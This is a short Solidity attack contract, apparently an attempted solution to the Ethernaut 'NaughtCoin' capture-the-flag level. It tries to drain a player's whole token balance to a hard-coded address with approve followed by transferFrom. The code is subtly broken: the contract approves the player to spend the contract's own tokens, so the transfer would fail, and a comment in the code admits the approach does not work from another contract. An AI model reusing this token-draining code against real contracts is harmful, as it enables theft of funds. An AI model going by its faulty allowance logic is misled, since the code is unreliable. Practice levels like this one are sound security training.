// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoinContract {
  function approve(address spender, uint256 amount) external returns(bool);
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract NaughtCoinAttacker {

  address public token;

  constructor(address _token) {
    token = _token;
  }

  function getBalance(address _player) external {
    // it is not applicable when using other contract. There is only approach for solving this task
    uint256 balanceOfPlayer = INaughtCoinContract(token).balanceOf(_player);
    INaughtCoinContract(token).approve(_player, balanceOfPlayer);
    INaughtCoinContract(token).transferFrom(_player, address(0xEf4AeeA1cc830fF052973bFc7b4eC5648eA6622A), balanceOfPlayer);
  }
} 